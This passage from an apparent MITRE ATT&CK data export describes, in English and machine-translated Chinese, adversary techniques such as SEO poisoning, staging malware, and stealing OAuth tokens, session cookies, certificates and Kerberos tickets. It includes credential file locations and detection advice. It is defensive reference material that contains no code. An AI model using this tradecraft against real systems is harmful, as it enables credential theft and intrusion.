SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",https://attack.mitre.org/techniques/T1608/006,30 September 2022,21 October 2022,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1608,,"Goldstein Menachem; Vijay Lalwani; Will Thomas, Equinix Threat Analysis Center (ETAC)",,,,,,,",",阶段能力/伪装能力/发起攻击：SEO中毒,攻击者可能会毒化影响搜索引擎优化 (SEO) 的机制，以进一步将分阶段的能力引向潜在的受害者。搜索引擎通常根据购买的广告以及由其网络爬虫和算法计算的网站排名/分数/声誉向用户显示结果。（引用：Atlas SEO）（引用：MalwareBytes SEO）帮助促进 [Drive-by Compromise] (https://attack.mitre.org/techniques/T1189)，攻击者可能会发布明确操纵 SEO 排名的内容，以推广托管其恶意负载的网站（例如 [Drive-by Target](https://attack. mitre.org/techniques/T1608/004)) 在搜索引擎中。毒化 SEO 排名可能涉及各种技巧，例如将关键字（包括以隐藏文本的形式）填充到受损网站中。这些关键字可能与目标受害者的兴趣/浏览习惯以及更广泛、季节性流行的主题（例如选举、热门新闻）有关。（引用：ZScaler SEO）（引用：Atlas SEO）对手也可能购买或植入指向分阶段功能的传入链接，以提高网站的计算相关性和声誉。（引用：MalwareBytes SEO）（引用：DFIR Report Gootloader）SEO 中毒也可能与规避重定向和其他隐藏机制（例如测量鼠标）相结合移动或基于浏览器用户代理、用户语言/本地化设置或 HTTP 标头提供内容），以便在避免防御者审查的同时提供 SEO 输入。（引用：ZScaler SEO）（引用：Sophos Gootloader）
T1608.001,Stage Capabilities: Upload Malware,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin.(Citation: Volexity Ocean Lotus November 2020)

Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",https://attack.mitre.org/techniques/T1608/001,17 March 2021,17 October 2021,1.1,Resource Development,"If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [User Execution](https://attack.mitre.org/techniques/T1204) or [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).",PRE,Internet Scan: Response Content,True,T1608,,"Kobi Haimovich, CardinalOps",,,,,,,"(Citation: Lacework TeamTNT May 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Mandiant UNC3890 Aug 2022),(Citation: McAfee Night Dragon),(Citation: Volexity Ocean Lotus November 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: Korean FSI TA505 2020),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Google EXOTIC LILY March 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Microsoft Actinium February 2022),(Citation: Proofpoint TA416 Europe March 2022),(Citation: MalwareBytes SideCopy Dec 2021),",阶段能力/伪装能力/发起攻击：上传恶意软件,攻击者可能会将恶意软件上传到第三方或攻击者控制的基础设施，以使其在定位期间可访问。恶意软件可能包括有效载荷、释放程序、入侵后工具、后门和各种其他恶意内容。攻击者可能会上传恶意软件以支持他们的操作，例如通过将有效负载放置在可访问 Internet 的 Web 服务器上，使受害网络可以使用 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) .恶意软件可能被放置在攻击者之前购买/租用的基础设施上（[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)）或被他们以其他方式入侵（[Compromise Infrastructure](https: //attack.mitre.org/techniques/T1584))。恶意软件也可以在 GitHub 或 Pastebin 等 Web 服务上上演。（引用：Volexity Ocean Lotus 2020 年 11 月）攻击者可能会将后门文件（如应用程序二进制文件、虚拟机映像或容器映像）上传到第三方软件商店或存储库（例如：GitHub、CNET、AWS 社区 AMI、Docker Hub）。偶然的机会，受害者可能会通过[用户执行]（https://attack.mitre.org/techniques/T1204）直接下载/安装这些后门文件。 [伪装](https://attack.mitre.org/techniques/T1036) 可能会增加用户错误执行这些文件的机会。
T1608.002,Stage Capabilities: Upload Tool,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)

Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",https://attack.mitre.org/techniques/T1608/002,17 March 2021,20 October 2022,1.2,Resource Development,"If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,,"(Citation: Dell TG-3390),(Citation: ESET Lazarus Jun 2020),(Citation: Mandiant UNC3890 Aug 2022),",阶段能力/伪装能力/发起攻击：上传工具,攻击者可以将工具上传到第三方或攻击者控制的基础设施，以使其在定位期间可访问。工具可以是开源的或闭源的、免费的或商业的。攻击者可以将工具用于恶意目的，但（与恶意软件不同）并非旨在用于这些目的（例如：[PsExec](https://attack.mitre.org/software/S0029)）。攻击者可能会上传工具以支持其操作，例如通过将工具放置在可访问 Internet 的 Web 服务器上，使受害网络可以使用工具以启用 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) .工具可能放置在攻击者之前购买/租用的基础设施上（[获取基础设施]（https://attack.mitre.org/techniques/T1583））或被他们以其他方式入侵（[妥协基础设施]（https： //attack.mitre.org/techniques/T1584)).（引用：Dell TG-3390）工具也可以部署在 Web 服务上，例如攻击者控制的 GitHub 存储库，或平台即服务产品使用户能够轻松配置应用程序。（引用：Dragos Heroku Watering Hole）（引用：Malwarebytes Heroku Skimmers）（引用：Intezer App Service 网络钓鱼）攻击者可以通过让受感染的受害者机器直接从第三方托管位置（例如：非对手控制的 GitHub 存储库），包括该工具的原始托管站点。
T1528,Steal Application Access Token,"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.

In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)

Token theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. 
 
Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)

Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  

",https://attack.mitre.org/techniques/T1528,04 September 2019,21 April 2022,1.2,Credential Access,"Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a “High severity app permissions” policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.

Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old “Last authorized” fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.

Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.","Azure AD, Containers, Google Workspace, Office 365, SaaS",User Account: User Account Modification,False,,,"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Jen Burns, HubSpot; Mark Wee; Ram Pliskin, Microsoft Azure Security Center; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army); Suzy Schapperle - Microsoft Azure Red Team",,,,,,,"(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: Peirates GitHub),(Citation: AADInternals Documentation),(Citation: Kubernetes Hardening Guide)",窃取应用程序访问令牌,攻击者可以窃取应用程序访问令牌作为获取凭据以访问远程系统和资源的一种手段。应用程序访问令牌用于代表用户或服务发出授权的 API 请求，通常用作访问云和基于容器的应用程序和软件即服务 (SaaS) 中的资源的一种方式。（引用：Auth0 - 为什么你应该始终使用访问令牌来保护 API 2019 年 9 月）OAuth 是一种常用的框架，它向用户颁发令牌以访问系统。在云和容器化环境中窃取帐户 API 令牌的攻击者可能能够访问数据并使用这些帐户的权限执行操作，这可能导致权限升级和环境的进一步危害。在 Kubernetes 环境中，在容器内运行的进程使用服务帐户令牌与 Kubernetes API 服务器进行通信。如果容器遭到破坏，攻击者可能会窃取容器的令牌，从而获得对 Kubernetes API 命令的访问权限。（引用：Kubernetes 服务帐户）令牌盗窃也可能通过社会工程发生，在这种情况下，可能需要用户操作授予访问权限。希望访问基于云的服务或受保护的 API 的应用程序可以通过各种授权协议使用 OAuth 2.0 进入。一个常用序列的示例是 Microsoft 的授权代码授予流程。（引文：Microsoft Identity Platform Protocols May 2019）（引文：Microsoft - OAuth 代码授权流程 - 2019 年 6 月）OAuth 访问令牌使第三方应用程序能够与资源交互以应用程序请求的方式包含用户数据，而无需获取用户凭据。攻击者可以通过构建一个恶意应用程序来利用 OAuth 授权，该应用程序旨在被授予使用目标用户的 OAuth 令牌访问资源的权限。（引用：Amnesty OAuth 网络钓鱼攻击，2019 年 8 月）（引用：Trend Micro Pawn Storm OAuth 2017）攻击者需要使用授权服务器完成其应用程序的注册，例如使用 Azure 门户、Visual Studio IDE、命令行界面、PowerShell 或 REST API 调用的 Microsoft Identity Platform。（引用：Microsoft - Azure AD 应用程序注册 - 2019 年 5 月）然后，他们可以向目标用户发送 [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) 以诱使他们授予对应用程序的访问权限。一旦授予 OAuth 访问令牌，应用程序就可以通过 [应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001) 获得对用户帐户功能的潜在长期访问权限。（引用： Microsoft - Azure AD 身份令牌 - 2019 年 8 月）应用程序访问令牌可能会在有限的生命周期内发挥作用，从而限制了攻击者使用被盗令牌的时间。但是，在某些情况下，攻击者也可以窃取应用程序刷新令牌（Citation: Auth0 Understanding Refresh Tokens），允许他们在不提示用户的情况下获取新的访问令牌。
T1539,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",https://attack.mitre.org/techniques/T1539,08 October 2019,28 July 2021,1.2,Credential Access,Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.,"Google Workspace, Linux, Office 365, SaaS, Windows, macOS","File: File Access, Process: Process Access",False,,,Johann Rehberger; Microsoft Threat Intelligence Center (MSTIC),User,,,,,,"(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Kaspersky TajMahal April 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: IBM Grandoreiro April 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Prevailion EvilNum May 2020),(Citation: Kaspersky QakBot September 2021),(Citation: ESET EvilNum July 2020),(Citation: Kroll Qakbot June 2020),(Citation: Evilginx 2 July 2018)",窃取Web会话 Cookie,攻击者可能会窃取 Web 应用程序或服务会话 cookie，并使用它们以经过身份验证的用户身份访问 Web 应用程序或 Internet 服务，而无需凭据。 Web 应用程序和服务通常在用户对网站进行身份验证后使用会话 cookie 作为身份验证令牌。 Cookie 通常会在很长一段时间内有效，即使 Web 应用程序没有被积极使用。 Cookie 可以在磁盘上、浏览器的进程内存中以及到远程系统的网络流量中找到。此外，目标机器上的其他应用程序可能会将敏感的身份验证 cookie 存储在内存中（例如，对云服务进行身份验证的应用程序）。会话 cookie 可用于绕过一些多因素身份验证协议。（引用：传递 Cookie）有几个恶意软件针对本地系统上的 Web 浏览器的 cookie 的示例。（引用：卡巴斯基泰姬陵 2019 年 4 月）（引用：第 42 单元Mac Crypto Cookies January 2019) 还有一些开源框架，例如 Evilginx 2 和 Muraena，可以通过恶意代理收集会话 cookie（例如：[Adversary-in-the-Middle](https://attack.mitre.org/技术/T1557)）可以由攻击者设置并用于网络钓鱼活动。（引用：Github evilginx2）（引用：GitHub Mauraena）攻击者获取有效 cookie 后，他们可以执行 [Web Session Cookie]（ https://attack.mitre.org/techniques/T1550/004) 技术来登录到相应的 Web 应用程序。
T1649,Steal or Forge Authentication Certificates,"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)

Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)

Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.

Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",https://attack.mitre.org/techniques/T1649,03 August 2022,21 October 2022,1.0,Credential Access,,"Azure AD, Linux, Windows, macOS","Active Directory: Active Directory Credential Request, Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Command: Command Execution, File: File Access, Logon Session: Logon Session Creation, Windows Registry: Windows Registry Key Access",False,,,"Lee Christensen, SpecterOps; Thirumalai Natarajan, Mandiant; Tristan Bennett, Seamless Intelligence",,,,,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: Mandiant APT29 Trello),(Citation: AADInternals Documentation),(Citation: SpecterOps Certified Pre Owned),(Citation: GitHub Certify),(Citation: GitHub PSPKIAudit)",窃取或伪造身份验证证书,攻击者可能会窃取或伪造用于身份验证的证书以访问远程系统或资源。数字证书通常用于对消息和/或文件进行签名和加密。证书也用作认证材料。例如，Azure AD 设备证书和 Active Directory 证书服务 (AD CS) 证书绑定到一个身份，并可用作域帐户的凭据。（引用：O365 博客 Azure AD 设备 ID）（引用：Microsoft AD CS 概述）身份验证证书既可以被盗也可以被伪造。例如，AD CS 证书可以从加密存储（在注册表或文件中）、放错位置的证书文件（即 [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)）或直接从通过各种加密 API 的 Windows 证书存储。（引用：SpecterOps Certified Pre Owned）（引用：GitHub CertStealer）（引用：GitHub GhostPack 证书）具有适当的注册权限，域内的用户和/或机器也可以请求和/或手动更新来自企业证书颁发机构 (CA) 的证书。此注册过程定义了与证书相关的各种设置和权限。值得注意的是，证书的扩展密钥使用 (EKU) 值定义了签名、加密和身份验证用例，而证书的主题备用名称 (SAN) 值定义了证书所有者的备用名称。（引用：Medium Certified Pre Owned）滥用证书身份验证凭证可能会启用其他行为，例如 [横向移动](https://attack.mitre.org/tactics/TA0008)。与证书相关的错误配置也可能为 [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) 提供机会，允许用户通过与相关联的身份 (SAN) 模拟或承担特权帐户或权限证书。这些滥用行为还可能通过窃取或伪造可用作[有效帐户](https://attack.mitre.org/techniques/ T1078）在证书有效期内，尽管用户密码重置。机器帐户的身份验证证书也可能被盗和伪造。有权访问根（或从属）CA 证书私钥（或保护/管理这些密钥的机制）的攻击者也可以通过伪造任意身份验证证书来建立 [Persistence](https://attack.mitre.org/tactics/TA0003)受害者域（称为“黄金”证书）。（引文：Medium Certified Pre Owned）攻击者也可能以证书和相关服务为目标，以访问其他形式的证书，例如 [Golden Ticket](https://attack. mitre.org/techniques/T1558/001) 授予票证 (TGT) 或 NTLM 明文。（引用：Medium Certified Pre Owned）
T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.

On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)

Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)


Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)
",https://attack.mitre.org/techniques/T1558,11 February 2020,08 March 2022,1.4,Credential Access,"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)

Monitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)

Monitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. 

Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)

Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.

Monitor for unusual processes accessing <code>secrets.ldb</code> and <code>.secrets.mkey</code> located in <code>/var/lib/sss/secrets/</code>.","Linux, Windows, macOS","Active Directory: Active Directory Credential Request, Command: Command Execution, File: File Access, Logon Session: Logon Session Metadata",False,,,"Cody Thomas, SpecterOps; Tim (Wadhwa-)Brown","root, User",,Kerberos authentication enabled,CAPEC-652,,,",(Citation: STIG krbtgt reset),(Citation: AdSecurity Cracking Kerberos Dec 2015)",窃取或伪造 Kerberos 票证,攻击者可能会试图通过窃取或伪造 Kerberos 票证来破坏 Kerberos 身份验证，以启用 [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)。 Kerberos 是一种在现代 Windows 域环境中广泛使用的身份验证协议。在称为“领域”的 Kerberos 环境中，存在三个基本参与者：客户端、服务和密钥分发中心 (KDC)。（引用：ADSecurity Kerberos Ring Decoder）客户端请求访问服务并通过交换 Kerberos 票证，源自 KDC，它们在成功通过身份验证后被授予访问权限。 KDC 负责身份验证和票证授予。攻击者可能试图通过窃取票证或伪造票证来滥用 Kerberos 以启用未经授权的访问。在 Windows 上，内置的 <code>klist</code> 实用程序可用于列出和分析缓存的 Kerberos 票证。（引用：Microsoft Klist）Active Directory 域上的 Linux 系统将 Kerberos 凭据本地存储在引用的凭据缓存文件中作为“ccache”。凭证在保持有效时存储在 ccache 文件中，并且通常在用户会话持续期间。（引用：MIT ccache）在现代 Redhat Enterprise Linux 系统和衍生发行版上，系统安全服务守护进程 (SSSD) 处理 Kerberos 票证。默认情况下，SSSD 维护票证数据库的副本，该副本可在 <code>/var/lib/sss/secrets/secrets.ldb</code> 中找到，以及位于 <code>/var/lib/ 中的相应密钥sss/secrets/.secrets.mkey</code>。这两个文件都需要 root 访问权限才能读取。如果攻击者能够访问数据库和密钥，则可以提取凭据缓存 Kerberos blob 并将其转换为可用的 Kerberos ccache 文件，攻击者可以将其用于 [Pass the Ticket](https://attack.mitre.org/techniques /T1550/003)。 ccache 文件也可以使用 Kekeo 等工具转换为 Windows 格式。（引文：Linux Kerberos 票证）（引文：将 MimiKatz 带到 Unix）（引文：Kekeo）macOS 上的 Kerberos 票证以标准 ccache 格式存储，类似到 Linux。默认情况下，对这些 ccache 条目的访问是通过 Mach RPC 协议通过 KCM 守护进程联合的，该协议使用调用者的环境来确定访问。这些 ccache 条目的存储位置受 <code>/etc/krb5.conf</code> 配置文件和 <code>KRB5CCNAME</code> 环境变量的影响，可以指定将它们保存到磁盘或保护它们通过 KCM 守护程序。用户可以使用 <code>kinit</code>、<code>klist</code>、<code>ktutil</code> 和 <code>kcc</code> 内置二进制文件或通过 Apple 的本机 Kerberos 框架。攻击者可以使用开源工具直接与 ccache 文件交互或使用 Kerberos 框架调用较低级别的 API 以提取用户的 TGT 或服务票证。（引用：SpectorOps Bifrost Kerberos macOS 2019）（引用：macOS kerberos 框架 MIT )
T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) 

Preauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014)

For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) 

An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)

